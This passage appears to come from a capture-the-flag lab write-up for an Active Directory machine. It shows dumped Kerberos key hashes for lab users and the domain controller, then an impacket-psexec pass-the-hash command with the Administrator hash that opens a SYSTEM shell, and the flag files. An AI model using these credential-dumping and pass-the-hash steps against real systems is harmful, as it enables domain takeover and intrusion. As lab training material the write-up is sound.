cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb
DC-JPQ225$:aes256-cts-hmac-sha1-96:01e2f9943c6c0c3f010dde6dddcae89cc81158e4f1c017e6fc34f85538d892b1
DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
[*] Cleaning up...
```
We have the hash of local `Administrator` in `dc-jpq225.cicada.vl`. So we can use `impacket-psexec` to create a shell directly to it:
```
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87 cicada.vl/Administrator@dc-jpq225.cicada.vl -k
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```
Now we get both flags:
```
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of C:\Users\Administrator\Desktop

04/10/2025  10:00 PM    <DIR>          .
09/13/2024  08:10 AM    <DIR>          ..
09/15/2024  05:26 AM             2,304 Microsoft Edge.lnk
11/14/2026  12:17 AM                34 root.txt
11/14/2026  12:17 AM                34 user.txt
               3 File(s)          2,372 bytes
               2 Dir(s)   3,447,652,352 bytes free

C:\Users\Administrator\Desktop> 
```